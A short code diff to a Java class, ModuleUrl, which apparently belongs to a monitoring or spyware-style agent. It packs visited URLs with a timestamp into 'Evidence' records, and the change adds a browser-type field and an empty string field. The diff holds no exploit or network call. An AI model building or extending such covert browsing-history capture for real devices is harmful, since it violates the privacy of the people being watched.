@@ -39,6 +39,8 @@ public final class ModuleUrl extends BaseModule {
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
+    private static final int BROWSER_TYPE = 7;
+
     public static String getStaticType() {
         return Messages.getString("1f.0");//"url";
     }
@@ -109,6 +111,8 @@ public final class ModuleUrl extends BaseModule {
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
+        items.addElement(Utils.intToByteArray(BROWSER_TYPE));
+        items.addElement(WChar.getBytes("",true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
         Evidence evidence = new Evidence(EvidenceType.URL);
